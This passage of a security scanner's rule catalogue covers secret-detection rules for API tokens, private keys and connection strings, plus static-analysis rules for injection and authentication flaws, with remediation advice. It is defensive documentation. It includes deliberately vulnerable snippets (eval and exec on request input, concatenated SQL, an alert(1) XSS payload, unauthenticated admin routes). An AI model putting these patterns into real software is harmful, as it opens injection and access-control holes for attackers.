**Safer Example:**
```
const key = process.env.MAILGUN_API_KEY; // from environment
```

**Remediation:** Rotate in Mailgun settings. Use domain-specific keys with minimal permissions.

---

### `secrets.twilio-auth-token`

**Twilio Auth Token**

> Unauthorized SMS/voice calls billed to your account, phone number takeover.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `twilio` `sms` `comms`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.TWILIO_AUTH_TOKEN; // from environment
```

**Remediation:** Rotate in Twilio console. Use API keys instead of the master auth token.

---

### `secrets.slack-bot-token`

**Slack Bot Token**

> Unauthorized Slack workspace access, message reading, and impersonation.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `slack` `comms` `workspace`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.SLACK_BOT_TOKEN; // from environment
```

**Remediation:** Revoke in Slack app settings. Rotate and store server-side only.

---

### `secrets.discord-webhook-url`

**Discord Webhook URL**

> Anyone can post messages to the channel. Can be used for spam or to leak alert data.

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `discord` `webhook` `comms`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.DISCORD_WEBHOOK_URL; // from environment
```

**Remediation:** Reset the webhook in Discord channel settings.

---

### `secrets.telegram-bot-token`

**Telegram Bot Token**

> Full bot control: read messages, send messages, impersonate the bot.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `telegram` `bot` `comms`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.TELEGRAM_BOT_TOKEN; // from environment
```

**Remediation:** Revoke via @BotFather /revoke command and issue a new token.

---

### `secrets.sentry-auth-token`

**Sentry Auth Token**

> Unauthorized access to Sentry projects, error data, and source maps.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `sentry` `monitoring` `error-tracking`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.SENTRY_AUTH_TOKEN; // from environment
```

**Remediation:** Rotate in Sentry API token settings. Use fine-grained scopes.

---

### `secrets.sentry-dsn`

**Sentry DSN**

> Public Sentry DSN exposes project info and allows event submission. Low impact unless combined with auth tokens.

| Field | Value |
|-------|-------|
| Severity | `info` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A02 Security Misconfiguration

**CWE:** CWE-200

**Tags:** `sentry` `monitoring` `public`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.SENTRY_DSN; // from environment
```

**Remediation:** Sentry DSN in frontend code is common and intended. Ensure no auth tokens are also exposed.

---

### `secrets.posthog-api-key`

**PostHog API Key**

> Unauthorized analytics data access and event injection.

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `posthog` `analytics` `monitoring`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.POSTHOG_API_KEY; // from environment
```

**Remediation:** PostHog project API keys are semi-public for ingestion. Protect personal API keys only.

---

### `secrets.datadog-api-key`

**Datadog API Key**

> Unauthorized metric ingestion, log access, and infrastructure visibility.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `datadog` `monitoring` `observability`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.DATADOG_API_KEY; // from environment
```

**Remediation:** Rotate in Datadog organization settings. Store server-side only.

---

### `secrets.new-relic-license-key`

**New Relic License Key**

> Unauthorized metric and log ingestion, APM data access.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `newrelic` `monitoring` `observability`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.NEW_RELIC_LICENSE_KEY; // from environment
```

**Remediation:** Rotate in New Relic account settings.

---

### `secrets.github-token`

**GitHub Personal Access Token**

> Unauthorized access to GitHub repos, CI/CD pipelines, and organization secrets.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `github` `ci-cd` `vcs`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.GITHUB_TOKEN; // from environment
```

**Remediation:** Revoke immediately in GitHub settings. Use fine-grained PATs with minimal permissions.

---

### `secrets.gitlab-token`

**GitLab Token**

> Unauthorized access to GitLab repositories and CI/CD pipelines.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `gitlab` `ci-cd` `vcs`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.GITLAB_TOKEN; // from environment
```

**Remediation:** Revoke in GitLab user settings. Use project-scoped access tokens where possible.

---

### `secrets.npm-token`

**npm Publish Token**

> Unauthorized package publishing enabling supply chain attacks.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures, A03 Software Supply Chain Failures

**CWE:** CWE-798

**Tags:** `npm` `registry` `supply-chain`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.NPM_TOKEN; // from environment
```

**Remediation:** Revoke in npm account settings. Use automation tokens scoped to specific packages.

---

### `secrets.dockerhub-token`

**Docker Hub Token**

> Unauthorized image pushes enabling supply chain attacks on container images.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `docker` `registry` `containers`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.DOCKERHUB_TOKEN; // from environment
```

**Remediation:** Rotate in Docker Hub access token settings. Scope to specific repos.

---

### `secrets.rsa-private-key`

**RSA Private Key**

> RSA private key exposed. Attackers can decrypt communications or impersonate the key owner.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-321

**Tags:** `private-key` `rsa` `cryptography`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.RSA_PRIVATE_KEY; // from environment
```

**Remediation:** Remove from source. Revoke and rotate the key pair immediately.

---

### `secrets.ec-private-key`

**EC Private Key**

> EC private key exposed. Attackers can forge signatures and decrypt ECDH-encrypted data.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-321

**Tags:** `private-key` `ec` `cryptography`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.EC_PRIVATE_KEY; // from environment
```

**Remediation:** Remove from source. Revoke and rotate the key pair immediately.

---

### `secrets.openssh-private-key`

**OpenSSH Private Key**

> SSH private key exposed. Attackers can authenticate to any server where the public key is authorized.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-321

**Tags:** `private-key` `ssh` `cryptography`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.OPENSSH_PRIVATE_KEY; // from environment
```

**Remediation:** Remove from source. Remove from authorized_keys on all servers and rotate.

---

### `secrets.pgp-private-key`

**PGP Private Key**

> PGP private key exposed. Attackers can decrypt PGP-encrypted messages.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-321

**Tags:** `private-key` `pgp` `cryptography`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.PGP_PRIVATE_KEY; // from environment
```

**Remediation:** Remove from source. Revoke and publish a new key immediately.

---

### `secrets.generic-private-key`

**Private Key Material**

> Cryptographic private key material exposed. Attackers can impersonate servers or decrypt data.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-321

**Tags:** `private-key` `pem` `cryptography`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.GENERIC_PRIVATE_KEY; // from environment
```

**Remediation:** Remove from source control. Revoke and rotate the key pair.

---

### `secrets.mysql-connection-string`

**MySQL Connection String**

> Direct MySQL access with credentials embedded in the connection string.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `database` `mysql` `credentials`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.MYSQL_CONNECTION_STRING; // from environment
```

**Remediation:** Rotate database credentials. Use a secrets manager or environment variables without committing.

---

### `secrets.mongodb-connection-string`

**MongoDB Connection String with Credentials**

> Direct MongoDB access with embedded credentials.

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `database` `mongodb` `credentials`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.MONGODB_CONNECTION_STRING; // from environment
```

**Remediation:** Rotate credentials. Use environment variables and never commit connection strings.

---

### `secrets.redis-connection-string`

**Redis Connection String with Password**

> Redis access with embedded password. Session data and cached secrets can be stolen.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `database` `redis` `credentials`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.REDIS_CONNECTION_STRING; // from environment
```

**Remediation:** Rotate the Redis password. Store connection string in environment variables only.

---

### `secrets.amqp-connection-string`

**AMQP / RabbitMQ Connection String**

> Message queue access. Attackers can read, inject, or consume sensitive messages.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `queue` `rabbitmq` `credentials`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.AMQP_CONNECTION_STRING; // from environment
```

**Remediation:** Rotate credentials. Store connection string in environment variables only.

---

### `secrets.smtp-connection-string`

**SMTP Connection String with Credentials**

> SMTP relay access. Attackers can send email from your domain.

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `secrets` |
| Category | Secrets |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A04 Cryptographic Failures

**CWE:** CWE-798

**Tags:** `email` `smtp` `credentials`

**Insecure Example:**
```
const key = "actual-secret-value"; // hardcoded — never do this
```

**Safer Example:**
```
const key = process.env.SMTP_CONNECTION_STRING; // from environment
```

**Remediation:** Rotate SMTP credentials. Use an email API service with API keys instead.

---

## Static Code Analysis (`static`)

### `injection.dangerous-set-inner-html`

**dangerouslySetInnerHTML Usage**

> React dangerouslySetInnerHTML bypasses React's built-in XSS protection and renders raw HTML directly into the DOM

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `medium` |
| Engine | `static` |
| Category | Injection |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A05 Injection

**CWE:** CWE-79

**ASVS:** ASVS 5.2.1

**WSTG:** WSTG-INPV-01

**Tags:** `xss` `react` `dom`

**Insecure Example:**
```
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

**Safer Example:**
```
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

**Remediation:** Avoid dangerouslySetInnerHTML. Use DOMPurify to sanitize HTML if raw rendering is required.

**False Positive Notes:** May fire on sanitized HTML. Check if DOMPurify or a similar sanitizer is applied before render.

---

### `injection.inner-html-assignment`

**innerHTML / outerHTML / insertAdjacentHTML**

> Direct DOM innerHTML assignment injects raw HTML without sanitization, enabling XSS if user-controlled input is used

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `medium` |
| Engine | `static` |
| Category | Injection |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A05 Injection

**CWE:** CWE-79

**ASVS:** ASVS 5.2.1

**WSTG:** WSTG-INPV-01

**Tags:** `xss` `dom`

**Insecure Example:**
```
element.innerHTML = req.body.comment;
```

**Safer Example:**
```
element.textContent = req.body.comment; // for plain text
// or: element.innerHTML = DOMPurify.sanitize(req.body.comment);
```

**Remediation:** Use textContent for plain text. Sanitize with DOMPurify before assigning innerHTML.

**False Positive Notes:** May fire on static HTML strings that contain no user input. Review whether the value is user-controlled.

---

### `injection.document-write`

**document.write Usage**

> document.write renders content directly into the document and can be exploited for XSS; it also blocks page rendering

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `static` |
| Category | Injection |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A05 Injection

**CWE:** CWE-79

**ASVS:** ASVS 5.2.1

**WSTG:** WSTG-INPV-01

**Tags:** `xss` `dom`

**Insecure Example:**
```
document.write("<script>alert(1)</script>");
```

**Safer Example:**
```
const el = document.createElement("p");
el.textContent = content;
document.body.appendChild(el);
```

**Remediation:** Replace with safe DOM manipulation APIs: createElement, appendChild, textContent.

---

### `injection.eval-usage`

**eval() / new Function() Usage**

> eval() and new Function() execute arbitrary code strings, enabling code injection and XSS if user input reaches them

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `high` |
| Engine | `static` |
| Category | Injection |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A05 Injection

**CWE:** CWE-78, CWE-79

**ASVS:** ASVS 5.2.4

**WSTG:** WSTG-INPV-11

**Tags:** `code-injection` `eval`

**Insecure Example:**
```
eval(req.body.expression); // remote code execution
```

**Safer Example:**
```
// Use a safe expression evaluator library, or redesign
// to avoid dynamic code execution entirely
```

**Remediation:** Never use eval() or new Function() with untrusted input. Redesign logic using safe alternatives.

**False Positive Notes:** Can fire on legitimate uses like JSON.parse alternatives or transpiler output. Review callsite.

---

### `injection.settimeout-string`

**setTimeout / setInterval with String Argument**

> String arguments to setTimeout/setInterval are passed to eval() internally, enabling code injection

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `high` |
| Engine | `static` |
| Category | Injection |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A05 Injection

**CWE:** CWE-79

**Tags:** `eval` `dom`

**Insecure Example:**
```
setTimeout("doSomething()", 1000); // string is eval'd
```

**Safer Example:**
```
setTimeout(() => doSomething(), 1000);
```

**Remediation:** Pass a function reference instead of a string: setTimeout(() => fn(), delay).

---

### `injection.prisma-query-raw-unsafe`

**Prisma.$queryRawUnsafe Usage**

> $queryRawUnsafe and $executeRawUnsafe bypass Prisma's parameterization, enabling SQL injection

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `high` |
| Engine | `static` |
| Category | Injection |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A05 Injection

**CWE:** CWE-89

**ASVS:** ASVS 5.3.4

**WSTG:** WSTG-INPV-05

**Tags:** `sql-injection` `prisma` `database`

**Insecure Example:**
```
await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE id = ${userId}`);
```

**Safer Example:**
```
await prisma.$queryRaw`SELECT * FROM users WHERE id = ${userId}`;
```

**Remediation:** Use Prisma.$queryRaw with tagged template literals, or use parameterized Prisma client methods.

---

### `injection.sql-string-concat`

**SQL String Concatenation**

> SQL query built by concatenating user-controlled variables enables SQL injection attacks

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `medium` |
| Engine | `static` |
| Category | Injection |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A05 Injection

**CWE:** CWE-89

**ASVS:** ASVS 5.3.4

**WSTG:** WSTG-INPV-05

**Tags:** `sql-injection` `database`

**Insecure Example:**
```
const q = `SELECT * FROM users WHERE name = '${req.query.name}'`;
```

**Safer Example:**
```
const q = "SELECT * FROM users WHERE name = ?";
db.query(q, [req.query.name]);
```

**Remediation:** Use parameterized queries or an ORM. Never concatenate user input into SQL strings.

**False Positive Notes:** May fire on SQL building with known-safe constant values. Review whether concatenated variables are user-controlled.

---

### `injection.child-process-exec`

**child_process.exec / execSync**

> exec() and execSync() invoke a shell command, enabling command injection if user input reaches the argument

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `medium` |
| Engine | `static` |
| Category | Injection |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A05 Injection

**CWE:** CWE-78

**ASVS:** ASVS 5.3.8

**WSTG:** WSTG-INPV-12

**Tags:** `command-injection` `rce` `shell`

**Insecure Example:**
```
exec(`convert ${req.body.file} output.png`); // command injection
```

**Safer Example:**
```
execFile('convert', [req.body.file, 'output.png']); // args array, no shell
```

**Remediation:** Use execFile() with an array of arguments instead. Never pass user input to exec().

**False Positive Notes:** Fires in tool scripts and build utilities where exec is called with static, trusted arguments. Review whether the argument contains user input.

---

### `auth.missing-middleware`

**Missing Next.js Middleware**

> No middleware.ts found in Next.js project — authentication is not enforced at the routing layer, making it easy to miss protecting routes

| Field | Value |
|-------|-------|
| Severity | `medium` |
| Confidence | `medium` |
| Engine | `static` |
| Category | Authentication |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A01 Broken Access Control, A07 Authentication Failures

**CWE:** CWE-284

**ASVS:** ASVS 1.4.1

**WSTG:** WSTG-ATHN-01

**Tags:** `nextjs` `middleware` `auth`

**Insecure Example:**
```
// No middleware.ts — every route is public by default
```

**Safer Example:**
```
// middleware.ts
import { clerkMiddleware, createRouteMatcher } from "@clerk/nextjs/server";
const isPublic = createRouteMatcher(["/", "/sign-in"]);
export default clerkMiddleware((auth, req) => { if (!isPublic(req)) auth().protect(); });
```

**Remediation:** Add middleware.ts to enforce authentication at the edge. Use Clerk, NextAuth, or custom JWT validation.

**False Positive Notes:** Some Next.js apps enforce auth per-route rather than in middleware. Verify your auth strategy.

---

### `auth.admin-route-no-auth`

**Admin Route Without Authentication Check**

> An API route under /admin or /api/admin has no detectable authentication guard, potentially allowing unauthenticated access

| Field | Value |
|-------|-------|
| Severity | `critical` |
| Confidence | `medium` |
| Engine | `static` |
| Category | Authentication |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A01 Broken Access Control, A07 Authentication Failures

**CWE:** CWE-284, CWE-306

**ASVS:** ASVS 1.4.2

**WSTG:** WSTG-ATHN-01

**Tags:** `admin` `auth` `access-control`

**Insecure Example:**
```
export async function GET() {
  return Response.json(await db.users.findAll()); // no auth
}
```

**Safer Example:**
```
export async function GET() {
  const { userId } = await auth();
  if (!userId) return new Response("Unauthorized", { status: 401 });
  const user = await db.users.findById(userId);
  if (user.role !== "admin") return new Response("Forbidden", { status: 403 });
  return Response.json(await db.users.findAll());
}
```

**Remediation:** Add authentication and role/admin check at the start of every admin route handler.

**False Positive Notes:** Auth may be enforced at the middleware layer. Verify your global auth strategy before suppressing.

---

### `auth.admin-route-no-role-check`

**Admin Route Missing Role Check**

> Admin route is authenticated but no role/admin check is present — any authenticated user may reach admin functionality

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `low` |
| Engine | `static` |
| Category | Authentication |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A01 Broken Access Control

**CWE:** CWE-284, CWE-285

**ASVS:** ASVS 4.1.3

**WSTG:** WSTG-ATHZ-02

**Tags:** `admin` `rbac` `access-control`

**Insecure Example:**
```
const { userId } = await auth(); // authenticated but no role check
return Response.json(await db.users.findAll());
```

**Safer Example:**
```
const { userId } = await auth();
const user = await db.users.findById(userId);
if (user.role !== "admin") return new Response("Forbidden", { status: 403 });
```

**Remediation:** Add a role check after authentication: verify the user has an admin role before proceeding.

**False Positive Notes:** Role check may use a different pattern not recognized. Review carefully before suppressing.

---

### `auth.protected-route-no-auth`

**Protected-Looking Route Without Authentication**

> Route path contains a sensitive keyword (dashboard, settings, billing, etc.) but no auth guard was detected

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `low` |
| Engine | `static` |
| Category | Authentication |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A01 Broken Access Control, A07 Authentication Failures

**CWE:** CWE-284

**ASVS:** ASVS 1.4.1

**WSTG:** WSTG-ATHN-01

**Tags:** `auth` `access-control`

**Insecure Example:**
```
// app/api/billing/route.ts — no auth check
export async function POST(req: Request) {
  const body = await req.json();
  return createSubscription(body.planId);
}
```

**Safer Example:**
```
const { userId } = await auth();
if (!userId) return new Response("Unauthorized", { status: 401 });
```

**Remediation:** Verify authentication is enforced. Add an explicit auth check at the top of the route handler.

**False Positive Notes:** Low confidence — auth may be enforced in middleware. Verify before suppressing.

---

### `auth.webhook-missing-signature`

**Webhook Route Missing Signature Verification**

> Webhook route processes events without verifying the provider's cryptographic signature — anyone can forge events

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `medium` |
| Engine | `static` |
| Category | Authentication |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A08 Software or Data Integrity Failures

**CWE:** CWE-347

**ASVS:** ASVS 10.3.2

**WSTG:** WSTG-BUSL-07

**Tags:** `webhook` `auth` `integrity`

**Insecure Example:**
```
export async function POST(req: Request) {
  const body = await req.json(); // no signature check
  await fulfillOrder(body.orderId);
}
```

**Safer Example:**
```
const sig = req.headers.get("stripe-signature")!;
const event = stripe.webhooks.constructEvent(rawBody, sig, process.env.STRIPE_WEBHOOK_SECRET!);
```

**Remediation:** Verify webhook signatures using the provider SDK: stripe.webhooks.constructEvent(), Svix, or x-hub-signature for GitHub/GitLab.

---

### `auth.stripe-payment-success-query-param`

**Payment Success Logic Trusting Query Parameters**

> Payment success/status is read from a query parameter — attackers can craft a ?success=true URL to bypass payment

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `medium` |
| Engine | `static` |
| Category | Authentication |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A08 Software or Data Integrity Failures

**CWE:** CWE-807

**ASVS:** ASVS 10.3.1

**WSTG:** WSTG-BUSL-04

**Tags:** `stripe` `payment` `integrity`

**Insecure Example:**
```
const success = searchParams.get("success"); // attacker can set ?success=true
```

**Safer Example:**
```
// Verify via webhook event or server-side API call
const session = await stripe.checkout.sessions.retrieve(sessionId);
if (session.payment_status !== "paid") return error();
```

**Remediation:** Verify payment status via Stripe webhook events or server-side Stripe API, never from client query params.

---

### `auth.clerk-api-route-no-auth`

**Clerk API Route Missing auth() Call**

> Clerk is detected in the project but this API route has no auth() or currentUser() call — may be publicly accessible

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `low` |
| Engine | `static` |
| Category | Authentication |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A01 Broken Access Control, A07 Authentication Failures

**CWE:** CWE-306

**ASVS:** ASVS 1.4.1

**WSTG:** WSTG-ATHN-01

**Tags:** `clerk` `auth` `nextjs`

**Insecure Example:**
```
export async function GET() {
  return Response.json(await db.profile.findAll()); // Clerk project but no auth()
}
```

**Safer Example:**
```
import { auth } from "@clerk/nextjs/server";
export async function GET() {
  const { userId } = auth();
  if (!userId) return new Response("Unauthorized", { status: 401 });
  return Response.json(await db.profile.findByUserId(userId));
}
```

**Remediation:** Call auth() or currentUser() from @clerk/nextjs at the top of every protected API route.

**False Positive Notes:** Low confidence — route may be intentionally public (e.g., public API endpoint). Verify intent.

---

### `auth.user-id-from-body`

**user_id Accepted from Request Body**

> user_id or ownerId is read from the client-controlled request body — enables IDOR/BOLA attacks

| Field | Value |
|-------|-------|
| Severity | `high` |
| Confidence | `medium` |
| Engine | `static` |
| Category | Authentication |
| Enabled by default | Yes |
| Safe for CI | Yes |
| Requires runtime | No |
| Requires auth config | No |

**OWASP Top 10:2025:** A01 Broken Access Control

**CWE:** CWE-639

**ASVS:** ASVS 4.2.1

**WSTG:** WSTG-ATHZ-04

**Tags:** `idor` `bola` `auth` `access-control`

**Insecure Example:**
```
const { userId } = await req.json(); // attacker sends any userId
await db.posts.findByUserId(userId);
```

**Safer Example:**
```
const { userId } = await auth(); // from verified session token
await db.posts.findByUserId(userId);
```

**Remediation:** Never trust user_id from the client. Extract it from the authenticated session server-side.

---

